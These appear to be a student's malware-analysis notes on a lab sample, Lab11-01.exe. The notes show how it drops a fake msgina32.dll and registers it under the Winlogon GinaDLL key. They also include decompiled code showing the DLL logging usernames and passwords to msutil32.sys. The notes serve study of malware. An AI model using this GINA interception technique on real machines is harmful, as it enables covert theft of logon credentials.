Lab11-01.exe
    PE Analysis
        # Virustotal
            46/72
            SHA-256: 57d8d248a8741176348b5d12dcf29f34c8f48ede0ca13c30d12e5ba0384056d7

            PEiD packer
                Microsoft Visual C++

            TimeStamp: 2011-11-06 18:55:06

            Subsystem: Windows CUI
            
            Sections
                Name	Virtual Address	Virtual Size	Raw Size	Entropy	MD5
                .text	4096	22086	24576	6.23	6bb361ab84e6ea32f545b12825db9c07
                .rdata	28672	2478	4096	3.77	23fde5162e5b17a6e440a468b942c3b8
                .data	32768	16040	12288	0.6	e433b4c400efc11a593220e77ab72779
                .rsrc	49152	6768	8192	4.15	9d561586eeb5ecda6c3214cd6a35d6f3

            IMPORT
                ADVAPI32.dll
                    RegSetValueExA
                    RegCreateKeyExA
                KERNEL32.dll
                    GetLastError
                    HeapFree
                    GetStdHandle
                    LCMapStringW
                    SetHandleCount
                    GetOEMCP
                    LCMapStringA
                    HeapDestroy
                    ExitProcess
                    FlushFileBuffers
                    GetEnvironmentStringsW
                    GetVersionExA
                    GetModuleFileNameA
                    RtlUnwind
                    LoadLibraryA
                    FreeEnvironmentStringsA
                    GetCurrentProcess
                    GetEnvironmentStrings
                    LockResource
                    GetCPInfo
                    UnhandledExceptionFilter
                    MultiByteToWideChar
                    FreeEnvironmentStringsW
                    GetCommandLineA
                    GetProcAddress
                    SetStdHandle
                    SetFilePointer
                    WideCharToMultiByte
                    GetStringTypeA
                    GetModuleHandleA
                    ReadFile
                    WriteFile
                    GetStartupInfoA
                    CloseHandle
                    GetACP
                    HeapReAlloc
                    GetStringTypeW
                    FreeResource
                    TerminateProcess
                    SizeofResource
                    GetEnvironmentVariableA
                    LoadResource
                    VirtualFree
                    GetFileType
                    SetEndOfFile
                    CreateFileA
                    HeapAlloc
                    GetVersion
                    FindResourceA
                    VirtualAlloc
                    HeapCreate

        # strings.exe (Only part of the results)
            gina.dll
            DllRegister
            DllUnregister
            ShellShutdownDialog
            WlxActivateUserShell
            WlxDisconnectNotify
            WlxDisplayLockedNotice
            WlxDisplaySASNotice
            WlxDisplayStatusMessage
            WlxGetConsoleSwitchCredentials
            WlxGetStatusMessage
            WlxInitialize
            WlxIsLockOk
            WlxIsLogoffOk
            WlxLoggedOnSAS
            WlxLoggedOutSAS
            WlxLogoff
            WlxNegotiate
            WlxNetworkProviderLoad
            WlxReconnectNotify
            WlxRemoveStatusMessage
            WlxScreenSaverNotify
            WlxShutdown
            WlxStartApplication
            WlxWkstaLockedSAS
            \MSGina
            ShellShutdownDialog
            WlxActivateUserShell
            WlxDisconnectNotify
            WlxDisplayLockedNotice
            WlxDisplaySASNotice
            WlxDisplayStatusMessage
            WlxGetConsoleSwitchCredentials
            WlxGetStatusMessage
            WlxInitialize
            WlxIsLockOk
            WlxIsLogoffOk
            WlxLoggedOnSAS
            WlxLogoff
            WlxNegotiate
            WlxNetworkProviderLoad
            WlxReconnectNotify
            WlxRemoveStatusMessage
            WlxScreenSaverNotify
            WlxShutdown
            WlxStartApplication
            WlxWkstaLockedSAS
            GinaDLL
            Software\Microsoft\Windows NT\CurrentVersion\Winlogon
            MSGina.dll
            UN %s DM %s PW %s OLD %s
            WlxLoggedOutSAS
            ErrorCode:%d ErrorMessage:%s.

    Dynamic Analysis
        # RegShot (Part of results)
            ----------------------------------
            Values added:1
            ----------------------------------
            HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GinaDLL: 43 3A 5C 44 6F 63 75 6D 65 6E 74 73 20 61 6E 64 20 53 65 74 74 69 6E 67 73 5C 70 72 61 63 74 69 63 65 5C 44 65 73 6B 74 6F 70 5C 6D 73 67 69 6E 61 33 32 2E 64 6C 6C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

        # procexp (View > Lower Pane View > DLLS / Handles)
            NULL

        # procmon
            Filter
                Process Name is Lab11-01.exe Include
                Operation is RegSetValue Include
                Operation is WriteFile Include
            
            Result
                2:10:21.1596330 PM	Lab11-01.exe	3736	WriteFile	C:\Documents and Settings\practice\Desktop\msgina32.dll	SUCCESS	Offset: 4,096, Length: 2,560
                2:10:21.1637173 PM	Lab11-01.exe	3736	RegSetValue	HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GinaDLL	SUCCESS	Type: REG_SZ, Length: 520, Data: C:\Documents and Settings\practice\Desktop\msgina32.dll
                
        # autoruns
            NULL

        # ApateDNS
            NULL
        
        # sc
            NULL

        # Resource Hacker
            TGAD.bin

        # IDA Pro
            After basically analysis through the decomplied code, we can know it may be a GINA inteceptor. It will release a msgina32.dll from its .rsrc section. And set value in registry HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GinaDLL. When we restart the machine the Winlogon will automatically call the msgina32.dll.
            int __cdecl main(int argc, const char **argv, const char **envp)
            {
            v9 = 0;
            hModule = GetModuleHandleA(0);
            Filename = 0;
            memset(&v6, 0, 0x10Cu);
            v7 = 0;
            v9 = release_TAGD_to_msgina32_dll(hModule);
            GetModuleFileNameA(0, &Filename, 0x10Eu);
            v8 = strrchr(&Filename, '\\');
            *v8 = 0;
            strcat(&Filename, aMsgina32Dll);
            set_registry((BYTE *)&Filename, 0x104u);
            return 0;
            }


TGAD.bin
    PE Analysis
        # Virustotal
            42/71
            SHA-256: f8a4f61bccd5bab1cad0ab9e57f6f3092a8bd4dd0adfcd4853e89ba96afc93f9

            PEiD packer
                Armadillo v1.xx - v2.xx

            TimeStamp: 2008-06-16 03:25:54

            Subsystem: Windows GUI
            
            Sections
                Name	Virtual Address	Virtual Size	Raw Size	Entropy	MD5
                .text	4096	2008	2048	5.51	0ee57ccaa92866bcba315150226b2a85
                .rdata	8192	1636	2048	4.34	18c5189f2f56129ec60f245500030867
                .data	12288	1032	1024	3.66	169ddca4ff2ee994d6c54e88abf4f82b
                .reloc	16384	240     512     2.63	202257ffd182568d24b4f676701b1f9d

            IMPORT
                ADVAPI32.dll
                    RegCreateKeyW
                    RegCloseKey
                    RegSetValueExW
                KERNEL32.dll
                    LocalFree
                    FormatMessageW
                    lstrcpyW
                    GetModuleFileNameW
                    GetSystemDirectoryW
                    LoadLibraryW
                    FreeLibrary
                    ExitProcess
                    DisableThreadLibraryCalls
                    lstrcatW
                    GetProcAddress
                    lstrlenW
                MSVCRT.dll
                USER32.dll
                    wsprintfA

            Exports
                DllRegister
                DllUnregister
                ShellShutdownDialog
                WlxActivateUserShell
                WlxDisconnectNotify
                WlxDisplayLockedNotice
                WlxDisplaySASNotice
                WlxDisplayStatusMessage
                WlxGetConsoleSwitchCredentials
                WlxGetStatusMessage
                WlxInitialize
                WlxIsLockOk
                WlxIsLogoffOk
                WlxLoggedOnSAS
                WlxLoggedOutSAS
                WlxLogoff
                WlxNegotiate
                WlxNetworkProviderLoad
                WlxReconnectNotify
                WlxRemoveStatusMessage
                WlxScreenSaverNotify
                WlxShutdown
                WlxStartApplication
                WlxWkstaLockedSAS

        # strings.exe (Only part of the results)
            gina.dll
            DllRegister
            DllUnregister
            ShellShutdownDialog
            WlxActivateUserShell
            WlxDisconnectNotify
            WlxDisplayLockedNotice
            WlxDisplaySASNotice
            WlxDisplayStatusMessage
            WlxGetConsoleSwitchCredentials
            WlxGetStatusMessage
            WlxInitialize
            WlxIsLockOk
            WlxIsLogoffOk
            WlxLoggedOnSAS
            WlxLoggedOutSAS
            WlxLogoff
            WlxNegotiate
            WlxNetworkProviderLoad
            WlxReconnectNotify
            WlxRemoveStatusMessage
            WlxScreenSaverNotify
            WlxShutdown
            WlxStartApplication
            WlxWkstaLockedSAS
            \MSGina
            ShellShutdownDialog
            WlxActivateUserShell
            WlxDisconnectNotify
            WlxDisplayLockedNotice
            WlxDisplaySASNotice
            WlxDisplayStatusMessage
            WlxGetConsoleSwitchCredentials
            WlxGetStatusMessage
            WlxInitialize
            WlxIsLockOk
            WlxIsLogoffOk
            WlxLoggedOnSAS
            WlxLogoff
            WlxNegotiate
            WlxNetworkProviderLoad
            WlxReconnectNotify
            WlxRemoveStatusMessage
            WlxScreenSaverNotify
            WlxShutdown
            WlxStartApplication
            WlxWkstaLockedSAS
            GinaDLL
            Software\Microsoft\Windows NT\CurrentVersion\Winlogon
            MSGina.dll
            UN %s DM %s PW %s OLD %s
            WlxLoggedOutSAS
            ErrorCode:%d ErrorMessage:%s.
            %s %s - %s
            msutil32.sys

        # IDA Pro
            BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
            {
            if ( fdwReason == 1 )
            {
                DisableThreadLibraryCalls(hinstDLL);
                hModule = hinstDLL;
                GetSystemDirectoryW(&Buffer, 0x104u);
                lstrcatW(&Buffer, L"\\MSGina");
                msgina32_handler = LoadLibraryW(&Buffer);                   // global var which can let user to call the export arguments
                result = msgina32_handler != 0;
            }
            else
            {
                if ( !fdwReason )
                {
                if ( msgina32_handler )
                    FreeLibrary(msgina32_handler);
                }
                result = 1;
            }
            return result;
            }

            Analyze the Exports: Most of Wlx*() will redirect to sub_10001000 which will let gina.dll accept and Process
                int WlxDisplayLockedNotice()
                {
                v0 = (int (*)(void))sub_10001000(aWlxdisplaylock_0);
                return v0();
                }

                FARPROC __stdcall sub_10001000(LPCSTR lpProcName)
                {
                FARPROC result; // eax
                CHAR v2; // [esp+4h] [ebp-10h]

                result = GetProcAddress(msgina32_handler, lpProcName);
                if ( !result )
                {
                    if ( !((unsigned int)lpProcName >> 16) )
                    wsprintfA(&v2, aD, lpProcName);
                    ExitProcess(0xFFFFFFFE);
                }
                return result;
                }

                Except these Wlx*(), we found there are other functions like sub_10001520(related to registry), sub_10001570. Let's focus on sub_10001570.
                FILE *sub_10001570(DWORD dwMessageId, wchar_t *Format, ...)                     // It is actually a logger.
                {
                va_start(va, Format);
                vsnwprintf(&Dest, 0x800u, Format, va);
                result = wfopen(msutil32_sys, &a);
                handler = result;
                if ( result )
                {
                    time = wstrtime(&Buffer);
                    date = wstrdate(&v8);
                    fwprintf(handler, ::Format, date, time, &Dest);
                    if ( dwMessageId )
                    {
                    FormatMessageW(0x1100u, 0, dwMessageId, 0x409u, v6, 0, 0);
                    fwprintf(handler, ErrorMessage, dwMessageId, *(_DWORD *)v6);
                    LocalFree(*(HLOCAL *)v6);
                    result = (FILE *)fclose(handler);
                    }
                    else
                    {
                    fwprintf(handler, asc_1000329C);
                    result = (FILE *)fclose(handler);
                    }
                }
                return result;
                }

                Ctrl+x on sub_10001520 > Up	p	WlxLoggedOutSAS+63	call    sub_10001570
                int __stdcall WlxLoggedOutSAS(int a1, int a2, int a3, int a4, int a5, int a6, _DWORD *a7, int a8)
                {
                v8 = sub_10001000(WlxLoggedOutSAS);                     // Just a redirect  <- msutil32.sys is under \system32\
                operator new(0x64u);
                v9 = ((int (__stdcall *)(int, int, int, int, int, int, _DWORD *, int))v8)(a1, a2, a3, a4, a5, a6, a7, a8);
                if ( v9 == 1 && *a7 )
                    sub_10001570(0, aUnSDmSPwSOldS, *a7, a7[1], a7[2], a7[3]);              // UN a7[0] DM a7[1] PW a7[2] OLD a7[3] <- arg_18
                return v9;
                }
                
Analysis
    It's a GINA inteceptor and it wil log the username and password during login.
